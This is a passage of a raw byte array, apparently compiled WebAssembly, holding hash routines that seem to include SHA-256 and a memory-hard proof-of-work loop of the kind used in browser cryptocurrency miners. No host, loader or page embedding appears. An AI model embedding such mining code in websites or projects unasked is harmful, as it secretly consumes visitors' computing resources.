3,65,196,0,106,34,4,65,0,54,2,0,32,3,65,140,1,106,34,7,65,0,54,2,0,32,3,32,0,32,1,65,255,255,255,255,1,113,34,8,16,24,32,1,65,192,255,255,255,1,113,34,1,32,8,73,4,64,3,64,32,0,32,1,106,44,0,0,33,9,32,5,32,5,40,2,0,34,10,65,1,106,54,2,0,32,3,65,200,0,106,32,10,106,32,9,58,0,0,32,1,65,1,106,34,1,32,8,71,13,0,11,11,32,7,40,2,0,34,1,4,64,32,3,32,5,40,2,0,106,65,199,0,106,34,0,65,1,32,1,116,65,127,106,65,8,32,1,107,116,32,0,45,0,0,113,58,0,0,32,3,32,5,40,2,0,106,65,199,0,106,34,0,65,1,65,7,32,7,40,2,0,107,116,32,0,45,0,0,115,58,0,0,32,7,65,0,54,2,0,5,32,5,32,5,40,2,0,34,0,65,1,106,54,2,0,32,3,65,200,0,106,32,0,106,65,128,127,58,0,0,11,2,64,2,64,32,5,40,2,0,34,0,65,56,74,4,64,32,0,65,192,0,72,4,64,3,64,32,5,32,0,65,1,106,54,2,0,32,3,65,200,0,106,32,0,106,65,0,58,0,0,32,5,40,2,0,34,0,65,192,0,72,13,0,11,11,32,3,32,3,65,200,0,106,65,192,0,16,24,32,5,65,0,54,2,0,65,0,33,0,12,1,5,32,0,65,56,71,13,1,11,12,1,11,3,64,32,5,32,0,65,1,106,54,2,0,32,3,65,200,0,106,32,0,106,65,0,58,0,0,32,5,40,2,0,34,0,65,56,72,13,0,11,11,32,6,32,6,40,2,0,65,1,106,34,1,54,2,0,32,1,69,4,64,32,4,32,4,40,2,0,65,1,106,54,2,0,11,32,5,65,192,0,54,2,0,65,192,0,33,0,3,64,32,5,32,0,65,127,106,34,0,54,2,0,32,3,65,200,0,106,32,0,106,32,1,58,0,0,32,1,65,8,118,33,1,32,5,40,2,0,34,0,65,60,74,13,0,11,32,6,32,1,54,2,0,32,0,65,56,74,4,64,32,4,40,2,0,33,1,3,64,32,5,32,0,65,127,106,34,0,54,2,0,32,3,65,200,0,106,32,0,106,32,1,58,0,0,32,1,65,8,118,33,1,32,5,40,2,0,34,0,65,56,74,13,0,11,32,4,32,1,54,2,0,11,32,3,32,3,65,200,0,106,65,192,0,16,24,32,3,65,144,2,106,34,4,32,3,41,2,0,55,2,0,32,4,32,3,41,2,8,55,2,8,32,4,32,3,41,2,16,55,2,16,32,4,32,3,41,2,24,55,2,24,32,4,32,3,41,2,32,55,2,32,32,4,32,3,41,2,40,55,2,40,32,4,32,3,41,2,48,55,2,48,32,4,32,3,41,2,56,55,2,56,32,4,32,3,65,208,1,106,34,1,65,0,16,10,32,1,32,3,65,144,1,106,34,0,65,1,16,10,32,0,32,1,65,2,16,10,32,1,32,0,65,3,16,10,32,0,32,1,65,4,16,10,32,1,32,0,65,5,16,10,32,0,32,1,65,6,16,10,32,1,32,0,65,7,16,10,32,0,32,1,65,8,16,10,32,1,32,4,65,9,16,10,32,3,32,3,40,2,0,32,4,40,2,0,115,54,2,0,32,3,65,4,106,34,0,32,0,40,2,0,32,4,40,2,4,115,54,2,0,32,3,65,8,106,34,0,32,0,40,2,0,32,4,40,2,8,115,54,2,0,32,3,65,12,106,34,0,32,0,40,2,0,32,4,40,2,12,115,54,2,0,32,3,65,16,106,34,0,32,0,40,2,0,32,4,40,2,16,115,54,2,0,32,3,65,20,106,34,0,32,0,40,2,0,32,4,40,2,20,115,54,2,0,32,3,65,24,106,34,0,32,0,40,2,0,32,4,40,2,24,115,54,2,0,32,3,65,28,106,34,0,32,0,40,2,0,32,4,40,2,28,115,54,2,0,32,3,65,32,106,34,0,40,2,0,32,4,40,2,32,115,33,6,32,0,32,6,54,2,0,32,3,65,36,106,34,0,40,2,0,32,4,40,2,36,115,33,7,32,0,32,7,54,2,0,32,3,65,40,106,34,0,40,2,0,32,4,40,2,40,115,33,8,32,0,32,8,54,2,0,32,3,65,44,106,34,0,40,2,0,32,4,40,2,44,115,33,9,32,0,32,9,54,2,0,32,3,65,48,106,34,0,40,2,0,32,4,40,2,48,115,33,10,32,0,32,10,54,2,0,32,3,65,52,106,34,0,40,2,0,32,4,40,2,52,115,33,1,32,0,32,1,54,2,0,32,3,65,56,106,34,0,32,0,40,2,0,32,4,40,2,56,115,54,2,0,32,11,32,11,40,2,0,32,4,40,2,60,115,54,2,0,32,2,32,6,58,0,0,32,2,32,6,65,8,118,58,0,1,32,2,32,6,65,16,118,58,0,2,32,2,32,6,65,24,118,58,0,3,32,2,32,7,58,0,4,32,2,32,7,65,8,118,58,0,5,32,2,32,7,65,16,118,58,0,6,32,2,32,7,65,24,118,58,0,7,32,2,32,8,58,0,8,32,2,32,8,65,8,118,58,0,9,32,2,32,8,65,16,118,58,0,10,32,2,32,8,65,24,118,58,0,11,32,2,32,9,58,0,12,32,2,32,9,65,8,118,58,0,13,32,2,32,9,65,16,118,58,0,14,32,2,32,9,65,24,118,58,0,15,32,2,32,10,58,0,16,32,2,32,10,65,8,118,58,0,17,32,2,32,10,65,16,118,58,0,18,32,2,32,10,65,24,118,58,0,19,32,2,32,1,58,0,20,32,2,32,1,65,8,118,58,0,21,32,2,32,1,65,16,118,58,0,22,32,2,32,3,44,0,55,58,0,23,32,2,32,0,44,0,0,58,0,24,32,2,32,3,44,0,57,58,0,25,32,2,32,3,44,0,58,58,0,26,32,2,32,3,44,0,59,58,0,27,32,2,32,11,44,0,0,58,0,28,32,2,32,3,44,0,61,58,0,29,32,2,32,3,44,0,62,58,0,30,32,2,32,3,44,0,63,58,0,31,32,3,36,4,11,93,1,1,127,32,1,32,0,72,32,0,32,1,32,2,106,72,113,4,64,32,1,32,2,106,33,1,32,0,34,3,32,2,106,33,0,3,64,32,2,65,0,74,4,64,32,2,65,1,107,33,2,32,0,65,1,107,34,0,32,1,65,1,107,34,1,44,0,0,58,0,0,12,1,11,11,32,3,33,0,5,32,0,32,1,32,2,16,11,26,11,32,0,11,180,13,1,11,127,35,4,33,6,35,4,65,160,3,106,36,4,32,6,34,7,65,128,4,54,2,0,32,7,65,128,2,54,2,8,32,7,65,32,106,34,3,65,192,41,41,3,0,55,3,0,32,3,65,200,41,41,3,0,55,3,8,32,3,65,208,41,41,3,0,55,3,16,32,3,65,216,41,41,3,0,55,3,24,32,3,65,224,41,41,3,0,55,3,32,32,3,65,232,41,41,3,0,55,3,40,32,3,65,240,41,41,3,0,55,3,48,32,3,65,248,41,41,3,0,55,3,56,32,7,65,16,106,34,13,66,0,55,3,0,32,7,65,24,106,34,11,66,128,128,128,128,128,128,128,128,240,0,55,3,0,32,7,65,12,106,34,12,65,0,54,2,0,32,7,65,8,106,33,9,32,1,65,255,255,255,255,1,113,34,6,65,127,106,34,10,65,64,113,33,8,32,1,65,3,116,65,135,4,75,4,64,32,9,32,0,32,10,65,6,118,65,192,0,16,23,32,6,32,8,107,33,6,32,0,32,8,106,33,0,11,32,6,4,64,32,9,65,216,0,106,32,12,40,2,0,34,1,106,32,0,32,6,16,11,26,32,12,32,1,32,6,106,54,2,0,11,32,7,65,160,2,106,33,4,2,64,2,64,2,64,2,64,32,7,40,2,0,65,8,118,65,3,113,14,3,2,1,0,3,11,32,7,65,8,106,33,9,32,11,32,11,41,3,0,66,128,128,128,128,128,128,128,128,128,127,132,55,3,0,32,12,40,2,0,34,0,65,192,0,73,4,64,32,9,65,216,0,106,32,0,106,65,0,65,192,0,32,0,107,16,14,26,11,32,9,32,7,65,224,0,106,34,5,65,1,32,0,16,23,32,9,40,2,0,65,7,106,65,3,118,33,8,32,5,66,0,55,3,0,32,5,66,0,55,3,8,32,5,66,0,55,3,16,32,5,66,0,55,3,24,32,5,66,0,55,3,32,32,5,66,0,55,3,40,32,5,66,0,55,3,48,32,5,66,0,55,3,56,32,4,32,3,41,3,0,55,3,0,32,4,32,3,41,3,8,55,3,8,32,4,32,3,41,3,16,55,3,16,32,4,32,3,41,3,24,55,3,24,32,4,32,3,41,3,32,55,3,32,32,4,32,3,41,3,40,55,3,40,32,4,32,3,41,3,48,55,3,48,32,4,32,3,41,3,56,55,3,56,32,8,4,64,32,8,65,127,106,65,6,118,33,10,65,0,33,6,65,0,33,0,3,64,32,5,32,6,173,55,3,0,32,13,66,0,55,3,0,32,11,66,128,128,128,128,128,128,128,128,127,55,3,0,32,12,65,0,54,2,0,32,9,32,5,65,1,65,8,16,23,32,2,32,0,106,32,3,32,8,32,0,107,34,0,65,192,0,73,4,127,32,0,5,65,192,0,11,16,11,26,32,3,32,4,41,3,0,55,3,0,32,3,32,4,41,3,8,55,3,8,32,3,32,4,41,3,16,55,3,16,32,3,32,4,41,3,24,55,3,24,32,3,32,4,41,3,32,55,3,32,32,3,32,4,41,3,40,55,3,40,32,3,32,4,41,3,48,55,3,48,32,3,32,4,41,3,56,55,3,56,32,6,65,1,106,34,1,65,6,116,33,0,32,6,32,10,71,4,64,32,1,33,6,12,1,11,11,11,32,7,36,4,15,11,32,7,65,8,106,33,10,32,11,32,11,41,3,0,66,128,128,128,128,128,128,128,128,128,127,132,55,3,0,32,12,40,2,0,34,0,65,32,73,4,64,32,10,65,56,106,32,0,106,65,0,65,32,32,0,107,16,14,26,11,32,10,32,7,65,192,0,106,34,8,65,1,32,0,16,25,32,10,40,2,0,65,7,106,65,3,118,33,6,32,8,66,0,55,3,0,32,8,66,0,55,3,8,32,8,66,0,55,3,16,32,8,66,0,55,3,24,32,4,32,3,41,3,0,55,3,0,32,4,32,3,41,3,8,55,3,8,32,4,32,3,41,3,16,55,3,16,32,4,32,3,41,3,24,55,3,24,32,6,4,64,65,0,33,0,3,64,32,8,32,0,173,55,3,0,32,13,66,0,55,3,0,32,11,66,128,128,128,128,128,128,128,128,127,55,3,0,32,12,65,0,54,2,0,32,10,32,8,65,1,65,8,16,25,32,2,32,0,106,32,3,32,6,32,0,107,34,1,65,32,73,4,127,32,1,5,65,32,11,16,11,26,32,3,32,4,41,3,0,55,3,0,32,3,32,4,41,3,8,55,3,8,32,3,32,4,41,3,16,55,3,16,32,3,32,4,41,3,24,55,3,24,32,6,32,0,65,32,106,34,0,75,13,0,11,11,32,7,36,4,15,11,32,11,32,11,41,3,0,66,128,128,128,128,128,128,128,128,128,127,132,55,3,0,32,12,40,2,0,34,0,65,128,1,73,4,64,32,7,65,160,1,106,32,0,106,65,0,65,128,1,32,0,107,16,14,26,11,32,7,65,8,106,34,8,32,7,65,160,1,106,34,5,65,1,32,0,16,26,32,8,40,2,0,65,7,106,65,3,118,33,9,32,5,66,0,55,3,0,32,5,66,0,55,3,8,32,5,66,0,55,3,16,32,5,66,0,55,3,24,32,5,66,0,55,3,32,32,5,66,0,55,3,40,32,5,66,0,55,3,48,32,5,66,0,55,3,56,32,5,66,0,55,3,64,32,5,66,0,55,3,72,32,5,66,0,55,3,80,32,5,66,0,55,3,88,32,5,66,0,55,3,96,32,5,66,0,55,3,104,32,5,66,0,55,3,112,32,5,66,0,55,3,120,32,4,32,3,41,3,0,55,3,0,32,4,32,3,41,3,8,55,3,8,32,4,32,3,41,3,16,55,3,16,32,4,32,3,41,3,24,55,3,24,32,4,32,3,41,3,32,55,3,32,32,4,32,3,41,3,40,55,3,40,32,4,32,3,41,3,48,55,3,48,32,4,32,3,41,3,56,55,3,56,32,4,32,3,41,3,64,55,3,64,32,4,32,3,41,3,72,55,3,72,32,4,32,3,41,3,80,55,3,80,32,4,32,3,41,3,88,55,3,88,32,4,32,3,41,3,96,55,3,96,32,4,32,3,41,3,104,55,3,104,32,4,32,3,41,3,112,55,3,112,32,4,32,3,41,3,120,55,3,120,32,9,4,64,32,9,65,127,106,65,7,118,33,10,65,0,33,6,65,0,33,0,3,64,32,5,32,6,173,55,3,0,32,13,66,0,55,3,0,32,11,66,128,128,128,128,128,128,128,128,127,55,3,0,32,12,65,0,54,2,0,32,8,32,5,65,1,65,8,16,26,32,2,32,0,106,32,3,32,9,32,0,107,34,0,65,128,1,73,4,127,32,0,5,65,128,1,11,16,11,26,32,3,32,4,41,3,0,55,3,0,32,3,32,4,41,3,8,55,3,8,32,3,32,4,41,3,16,55,3,16,32,3,32,4,41,3,24,55,3,24,32,3,32,4,41,3,32,55,3,32,32,3,32,4,41,3,40,55,3,40,32,3,32,4,41,3,48,55,3,48,32,3,32,4,41,3,56,55,3,56,32,3,32,4,41,3,64,55,3,64,32,3,32,4,41,3,72,55,3,72,32,3,32,4,41,3,80,55,3,80,32,3,32,4,41,3,88,55,3,88,32,3,32,4,41,3,96,55,3,96,32,3,32,4,41,3,104,55,3,104,32,3,32,4,41,3,112,55,3,112,32,3,32,4,41,3,120,55,3,120,32,6,65,1,106,34,1,65,7,116,33,0,32,6,32,10,71,4,64,32,1,33,6,12,1,11,11,11,32,7,36,4,15,11,32,7,36,4,11,214,9,2,4,127,2,126,35,4,33,3,35,4,65,224,1,106,36,4,32,3,65,8,106,34,5,66,0,55,3,8,32,3,65,128,2,54,2,0,32,3,65,32,106,34,4,65,176,62,41,0,0,55,0,0,32,4,65,184,62,41,0,0,55,0,8,32,4,65,192,62,41,0,0,55,0,16,32,4,65,200,62,41,0,0,55,0,24,32,4,65,208,62,41,0,0,55,0,32,32,4,65,216,62,41,0,0,55,0,40,32,4,65,224,62,41,0,0,55,0,48,32,4,65,232,62,41,0,0,55,0,56,32,4,65,240,62,41,0,0,55,0,64,32,4,65,248,62,41,0,0,55,0,72,32,4,65,128,63,41,0,0,55,0,80,32,4,65,136,63,41,0,0,55,0,88,32,4,65,144,63,41,0,0,55,0,96,32,4,65,152,63,41,0,0,55,0,104,32,4,65,160,63,41,0,0,55,0,112,32,4,65,168,63,41,0,0,55,0,120,32,5,32,1,65,3,116,34,1,173,34,7,55,3,0,32,1,65,255,3,75,4,127,32,3,65,160,1,106,33,1,3,64,32,1,32,0,32,8,167,106,34,4,41,0,0,55,0,0,32,1,32,4,41,0,8,55,0,8,32,1,32,4,41,0,16,55,0,16,32,1,32,4,41,0,24,55,0,24,32,1,32,4,41,0,32,55,0,32,32,1,32,4,41,0,40,55,0,40,32,1,32,4,41,0,48,55,0,48,32,1,32,4,41,0,56,55,0,56,32,3,16,22,32,8,66,192,0,124,33,8,32,7,66,128,124,124,34,7,66,255,3,86,13,0,11,32,8,167,5,65,0,11,33,1,32,3,65,16,106,33,4,32,7,66,0,82,4,64,32,3,65,160,1,106,33,6,32,0,32,1,106,33,0,32,7,66,3,136,66,63,131,33,8,32,7,66,7,131,66,0,81,4,127,32,6,32,0,32,8,167,16,11,5,32,6,32,0,32,8,66,1,124,167,16,11,11,26,32,4,32,7,55,3,0,11,32,5,41,3,0,34,7,66,255,3,131,34,8,66,0,81,4,64,32,3,65,160,1,106,34,0,66,0,55,3,0,32,0,66,0,55,3,8,32,0,66,0,55,3,16,32,0,66,0,55,3,24,32,0,66,0,55,3,32,32,0,66,0,55,3,40,32,0,66,0,55,3,48,32,0,66,0,55,3,56,32,0,65,128,127,58,0,0,32,3,32,7,60,0,223,1,32,3,32,7,66,8,136,60,0,222,1,32,3,32,7,66,16,136,60,0,221,1,32,3,32,7,66,24,136,60,0,220,1,32,3,32,7,66,32,136,60,0,219,1,32,3,32,7,66,40,136,60,0,218,1,32,3,32,7,66,48,136,60,0,217,1,32,3,32,7,66,56,136,60,0,216,1,32,3,16,22,5,32,8,66,3,136,33,8,32,4,41,3,0,66,7,131,66,0,81,4,64,32,8,167,34,0,65,192,0,73,4,64,32,3,32,0,65,160,1,106,106,65,0,65,192,0,32,0,107,16,14,26,11,5,32,8,66,1,124,167,34,0,65,192,0,73,4,64,32,3,32,0,65,160,1,106,106,65,0,65,192,0,32,0,107,16,14,26,11,11,32,3,65,160,1,106,32,7,66,3,136,167,65,63,113,106,34,0,65,1,32,7,167,65,7,113,65,7,115,116,32,0,45,0,0,114,58,0,0,32,3,16,22,32,3,65,160,1,106,34,0,66,0,55,3,0,32,0,66,0,55,3,8,32,0,66,0,55,3,16,32,0,66,0,55,3,24,32,0,66,0,55,3,32,32,0,66,0,55,3,40,32,0,66,0,55,3,48,32,0,66,0,55,3,56,32,3,32,5,41,3,0,34,7,60,0,223,1,32,3,32,7,66,8,136,60,0,222,1,32,3,32,7,66,16,136,60,0,221,1,32,3,32,7,66,24,136,60,0,220,1,32,3,32,7,66,32,136,60,0,219,1,32,3,32,7,66,40,136,60,0,218,1,32,3,32,7,66,48,136,60,0,217,1,32,3,32,7,66,56,136,60,0,216,1,32,3,16,22,11,2,64,2,64,2,64,2,64,2,64,32,3,40,2,0,65,160,126,106,34,0,65,5,118,32,0,65,27,116,114,14,10,0,1,4,4,4,2,4,4,4,3,4,11,32,2,32,3,65,132,1,106,34,0,41,0,0,55,0,0,32,2,32,0,41,0,8,55,0,8,32,2,32,0,41,0,16,55,0,16,32,2,32,0,40,0,24,54,0,24,32,3,36,4,15,11,32,2,32,3,65,128,1,106,34,0,41,0,0,55,0,0,32,2,32,0,41,0,8,55,0,8,32,2,32,0,41,0,16,55,0,16,32,2,32,0,41,0,24,55,0,24,32,3,36,4,15,11,32,2,32,3,65,240,0,106,34,0,41,0,0,55,0,0,32,2,32,0,41,0,8,55,0,8,32,2,32,0,41,0,16,55,0,16,32,2,32,0,41,0,24,55,0,24,32,2,32,0,41,0,32,55,0,32,32,2,32,0,41,0,40,55,0,40,32,3,36,4,15,11,32,2,32,3,65,224,0,106,34,0,41,0,0,55,0,0,32,2,32,0,41,0,8,55,0,8,32,2,32,0,41,0,16,55,0,16,32,2,32,0,41,0,24,55,0,24,32,2,32,0,41,0,32,55,0,32,32,2,32,0,41,0,40,55,0,40,32,2,32,0,41,0,48,55,0,48,32,2,32,0,41,0,56,55,0,56,32,3,36,4,15,11,32,3,36,4,11,209,6,1,14,127,35,4,33,3,35,4,65,144,1,106,36,4,32,3,65,231,204,167,208,6,54,2,0,32,3,65,4,106,34,10,65,133,221,158,219,123,54,2,0,32,3,65,8,106,34,11,65,242,230,187,227,3,54,2,0,32,3,65,12,106,34,12,65,186,234,191,170,122,54,2,0,32,3,65,16,106,34,13,65,255,164,185,136,5,54,2,0,32,3,65,20,106,34,14,65,140,209,149,216,121,54,2,0,32,3,65,24,106,34,15,65,171,179,143,252,1,54,2,0,32,3,65,28,106,34,16,65,153,154,131,223,5,54,2,0,32,3,65,32,106,34,7,66,0,55,2,0,32,7,66,0,55,2,8,32,7,66,0,55,2,16,32,7,66,0,55,2,24,32,3,32,0,32,1,173,66,3,134,16,17,32,3,65,137,1,106,34,1,65,129,127,58,0,0,32,3,65,136,1,106,34,0,65,1,58,0,0,32,3,65,128,1,106,34,5,32,3,40,2,52,32,3,40,2,56,34,6,32,3,65,48,106,34,4,40,2,0,34,9,106,34,8,32,6,73,106,34,7,65,24,118,58,0,0,32,5,32,7,65,16,118,58,0,1,32,5,32,7,65,8,118,58,0,2,32,5,32,7,58,0,3,32,5,32,8,65,24,118,58,0,4,32,5,32,8,65,16,118,58,0,5,32,5,32,8,65,8,118,58,0,6,32,5,32,8,58,0,7,32,6,65,184,3,70,4,64,32,4,32,9,65,120,106,54,2,0,32,3,32,1,66,8,16,17,32,4,40,2,0,33,0,5,32,6,65,184,3,72,4,64,32,6,69,4,64,32,3,65,1,54,2,60,11,32,4,32,9,65,200,124,106,32,6,106,54,2,0,32,3,65,240,61,65,184,3,32,6,107,172,16,17,5,32,4,32,9,65,128,124,106,32,6,106,54,2,0,32,3,65,240,61,65,128,4,32,6,107,172,16,17,32,4,32,4,40,2,0,65,200,124,106,54,2,0,32,3,65,241,61,66,184,3,16,17,32,3,65,1,54,2,60,11,32,3,32,0,66,8,16,17,32,4,32,4,40,2,0,65,120,106,34,0,54,2,0,11,32,4,32,0,65,64,106,54,2,0,32,3,32,5,66,192,0,16,17,32,2,32,3,40,2,0,34,0,65,24,118,58,0,0,32,2,32,0,65,16,118,58,0,1,32,2,32,0,65,8,118,58,0,2,32,2,32,0,58,0,3,32,2,32,10,40,2,0,34,0,65,24,118,58,0,4,32,2,32,0,65,16,118,58,0,5,32,2,32,0,65,8,118,58,0,6,32,2,32,0,58,0,7,32,2,32,11,40,2,0,34,0,65,24,118,58,0,8,32,2,32,0,65,16,118,58,0,9,32,2,32,0,65,8,118,58,0,10,32,2,32,0,58,0,11,32,2,32,12,40,2,0,34,0,65,24,118,58,0,12,32,2,32,0,65,16,118,58,0,13,32,2,32,0,65,8,118,58,0,14,32,2,32,0,58,0,15,32,2,32,13,40,2,0,34,0,65,24,118,58,0,16,32,2,32,0,65,16,118,58,0,17,32,2,32,0,65,8,118,58,0,18,32,2,32,0,58,0,19,32,2,32,14,40,2,0,34,0,65,24,118,58,0,20,32,2,32,0,65,16,118,58,0,21,32,2,32,0,65,8,118,58,0,22,32,2,32,0,58,0,23,32,2,32,15,40,2,0,34,0,65,24,118,58,0,24,32,2,32,0,65,16,118,58,0,25,32,2,32,0,65,8,118,58,0,26,32,2,32,0,58,0,27,32,2,32,16,40,2,0,34,0,65,24,118,58,0,28,32,2,32,0,65,16,118,58,0,29,32,2,32,0,65,8,118,58,0,30,32,2,32,0,58,0,31,32,3,36,4,11,184,22,2,27,127,10,126,35,4,33,7,35,4,65,208,1,106,36,4,32,7,32,1,41,0,0,55,0,0,32,7,32,1,41,0,8,55,0,8,32,7,32,1,41,0,16,55,0,16,32,7,32,1,41,0,24,55,0,24,32,7,32,1,41,0,32,55,0,32,32,7,32,1,41,0,40,55,0,40,32,7,32,1,41,0,48,55,0,48,32,7,32,1,41,0,56,55,0,56,32,7,32,1,41,0,64,55,0,64,32,7,32,1,40,0,72,54,0,72,32,7,65,208,0,106,34,1,66,0,55,3,0,32,1,66,0,55,3,8,32,1,66,0,55,3,16,32,1,66,0,55,3,24,32,1,66,0,55,3,32,32,1,66,0,55,3,40,32,1,66,0,55,3,48,32,1,66,0,55,3,56,32,1,66,0,55,3,64,32,1,66,0,55,3,72,32,1,66,0,55,3,80,32,1,66,0,55,3,88,32,1,66,0,55,3,96,32,1,66,0,55,3,104,32,1,66,0,55,3,112,32,7,65,200,0,106,34,1,32,1,41,3,0,66,255,255,255,255,15,131,66,128,128,128,128,16,132,55,3,0,32,7,66,128,128,128,128,128,128,128,128,128,127,55,3,128,1,32,7,65,8,106,34,1,32,1,40,2,0,65,158,142,249,132,126,115,54,2,0,32,7,16,19,32,0,65,128,128,128,1,106,34,19,32,7,65,200,1,16,11,26,32,0,65,208,129,128,1,106,34,4,32,0,65,192,128,128,1,106,34,5,41,3,0,55,3,0,32,4,32,5,41,3,8,55,3,8,32,4,32,5,41,3,16,55,3,16,32,4,32,5,41,3,24,55,3,24,32,4,32,5,41,3,32,55,3,32,32,4,32,5,41,3,40,55,3,40,32,4,32,5,41,3,48,55,3,48,32,4,32,5,41,3,56,55,3,56,32,4,32,5,41,3,64,55,3,64,32,4,32,5,41,3,72,55,3,72,32,4,32,5,41,3,80,55,3,80,32,4,32,5,41,3,88,55,3,88,32,4,32,5,41,3,96,55,3,96,32,4,32,5,41,3,104,55,3,104,32,4,32,5,41,3,112,55,3,112,32,4,32,5,41,3,120,55,3,120,32,0,65,240,130,128,1,106,34,16,32,0,65,208,128,128,1,106,41,3,0,32,5,41,3,0,133,55,3,0,32,0,65,248,130,128,1,106,34,17,32,0,65,216,128,128,1,106,41,3,0,32,0,65,200,128,128,1,106,41,3,0,133,55,3,0,32,0,65,224,128,128,1,106,41,3,0,33,33,32,0,65,232,128,128,1,106,41,3,0,33,35,32,0,65,144,131,128,1,106,34,8,40,2,0,32,19,16,18,32,0,65,224,129,128,1,106,33,20,32,0,65,240,129,128,1,106,33,21,32,0,65,128,130,128,1,106,33,22,32,0,65,144,130,128,1,106,33,23,32,0,65,160,130,128,1,106,33,24,32,0,65,176,130,128,1,106,33,25,32,0,65,192,130,128,1,106,33,26,65,0,33,1,3,64,32,4,32,8,40,2,0,40,2,0,40,2,12,16,9,32,20,32,8,40,2,0,40,2,0,40,2,12,16,9,32,21,32,8,40,2,0,40,2,0,40,2,12,16,9,32,22,32,8,40,2,0,40,2,0,40,2,12,16,9,32,23,32,8,40,2,0,40,2,0,40,2,12,16,9,32,24,32,8,40,2,0,40,2,0,40,2,12,16,9,32,25,32,8,40,2,0,40,2,0,40,2,12,16,9,32,26,32,8,40,2,0,40,2,0,40,2,12,16,9,32,0,32,1,106,34,3,32,4,41,0,0,55,0,0,32,3,32,4,41,0,8,55,0,8,32,3,32,4,41,0,16,55,0,16,32,3,32,4,41,0,24,55,0,24,32,3,32,4,41,0,32,55,0,32,32,3,32,4,41,0,40,55,0,40,32,3,32,4,41,0,48,55,0,48,32,3,32,4,41,0,56,55,0,56,32,3,32,4,41,0,64,55,0,64,32,3,32,4,41,0,72,55,0,72,32,3,32,4,41,0,80,55,0,80,32,3,32,4,41,0,88,55,0,88,32,3,32,4,41,0,96,55,0,96,32,3,32,4,41,0,104,55,0,104,32,3,32,4,41,0,112,55,0,112,32,3,32,4,41,0,120,55,0,120,32,1,65,128,1,106,34,1,65,128,128,128,1,73,13,0,11,32,0,65,208,130,128,1,106,34,10,32,0,65,160,128,128,1,106,34,29,41,3,0,32,19,41,3,0,133,34,37,55,3,0,32,0,65,216,130,128,1,106,34,12,32,0,65,168,128,128,1,106,41,3,0,32,0,65,136,128,128,1,106,41,3,0,133,55,3,0,32,0,65,224,130,128,1,106,34,13,32,0,65,176,128,128,1,106,41,3,0,32,0,65,144,128,128,1,106,41,3,0,133,55,3,0,32,0,65,232,130,128,1,106,34,14,32,0,65,184,128,128,1,106,41,3,0,32,0,65,152,128,128,1,106,41,3,0,133,55,3,0,32,0,65,128,131,128,1,106,33,15,32,0,65,136,131,128,1,106,33,6,65,0,33,1,32,37,167,33,3,3,64,32,0,32,3,65,240,255,255,0,113,34,3,106,34,11,32,15,32,10,16,20,32,0,32,3,65,16,115,106,34,9,41,3,0,33,37,32,9,65,8,106,34,18,41,3,0,33,34,32,9,32,16,41,3,0,32,0,32,3,65,48,115,106,34,9,41,3,0,124,55,3,0,32,18,32,17,41,3,0,32,9,65,8,106,34,18,41,3,0,124,55,3,0,32,9,32,10,41,3,0,32,0,32,3,65,32,115,106,34,3,41,3,0,124,55,3,0,32,18,32,12,41,3,0,32,3,65,8,106,34,9,41,3,0,124,55,3,0,32,3,32,13,41,3,0,32,37,124,55,3,0,32,9,32,14,41,3,0,32,34,124,55,3,0,32,11,32,13,41,3,0,32,15,41,3,0,133,55,3,0,32,11,32,14,41,3,0,32,6,41,3,0,133,55,3,8,32,0,32,15,41,3,0,34,31,167,34,11,65,240,255,255,0,113,34,3,106,34,18,65,8,106,34,30,41,3,0,33,39,32,6,41,3,0,34,37,32,35,167,65,1,116,32,11,106,65,129,128,128,128,120,114,173,34,34,130,66,32,134,32,37,32,34,128,66,255,255,255,255,15,131,132,34,37,32,31,124,34,32,186,68,0,0,0,0,0,0,240,67,160,159,68,0,0,0,0,0,0,0,64,162,68,0,0,0,0,0,0,0,194,160,177,34,34,66,1,136,34,36,32,34,66,1,131,34,38,124,32,36,126,32,34,66,32,134,124,34,40,32,38,124,32,32,86,65,31,116,65,31,117,32,40,66,128,128,128,128,16,124,32,32,32,36,125,84,106,172,32,34,124,33,34,32,35,66,32,134,32,33,133,32,18,41,3,0,133,34,35,66,32,136,34,36,32,31,66,255,255,255,255,15,131,34,32,126,33,33,32,35,66,255,255,255,255,15,131,34,38,32,32,126,33,32,32,33,32,38,32,31,66,32,136,34,38,126,124,32,32,66,32,136,124,34,31,66,32,136,32,36,32,38,126,124,32,31,32,33,84,173,66,32,134,124,34,36,32,0,32,3,65,16,115,106,34,11,41,3,0,133,33,33,32,11,32,33,55,3,0,32,11,65,8,106,34,27,41,3,0,32,31,66,32,134,32,32,66,255,255,255,255,15,131,132,34,32,133,33,31,32,27,32,31,55,3,0,32,0,32,3,65,32,115,106,34,9,41,3,0,32,36,133,33,36,32,9,65,8,106,34,28,41,3,0,32,32,133,33,32,32,11,32,16,41,3,0,32,0,32,3,65,48,115,106,34,3,41,3,0,124,55,3,0,32,27,32,17,41,3,0,32,3,65,8,106,34,11,41,3,0,124,55,3,0,32,3,32,10,41,3,0,32,9,41,3,0,124,55,3,0,32,11,32,12,41,3,0,32,28,41,3,0,124,55,3,0,32,9,32,13,41,3,0,32,33,124,55,3,0,32,28,32,14,41,3,0,32,31,124,55,3,0,32,10,32,10,41,3,0,32,36,124,34,33,55,3,0,32,12,32,12,41,3,0,32,32,124,34,31,55,3,0,32,18,32,33,55,3,0,32,30,32,31,55,3,0,32,10,32,10,41,3,0,32,35,133,34,35,55,3,0,32,12,32,12,41,3,0,32,39,133,55,3,0,32,16,32,13,41,3,0,55,3,0,32,17,32,14,41,3,0,55,3,0,32,13,32,15,41,3,0,55,3,0,32,14,32,6,41,3,0,55,3,0,32,35,167,33,3,32,1,65,1,106,34,1,65,128,128,32,71,4,64,32,37,33,33,32,34,33,35,12,1,11,11,32,4,32,5,41,3,0,55,3,0,32,4,32,5,41,3,8,55,3,8,32,4,32,5,41,3,16,55,3,16,32,4,32,5,41,3,24,55,3,24,32,4,32,5,41,3,32,55,3,32,32,4,32,5,41,3,40,55,3,40,32,4,32,5,41,3,48,55,3,48,32,4,32,5,41,3,56,55,3,56,32,4,32,5,41,3,64,55,3,64,32,4,32,5,41,3,72,55,3,72,32,4,32,5,41,3,80,55,3,80,32,4,32,5,41,3,88,55,3,88,32,4,32,5,41,3,96,55,3,96,32,4,32,5,41,3,104,55,3,104,32,4,32,5,41,3,112,55,3,112,32,4,32,5,41,3,120,55,3,120,32,8,40,2,0,32,29,16,18,32,0,65,216,129,128,1,106,33,3,32,0,65,232,129,128,1,106,33,10,32,0,65,248,129,128,1,106,33,12,32,0,65,136,130,128,1,106,33,13,32,0,65,152,130,128,1,106,33,14,32,0,65,168,130,128,1,106,33,15,32,0,65,184,130,128,1,106,33,16,32,0,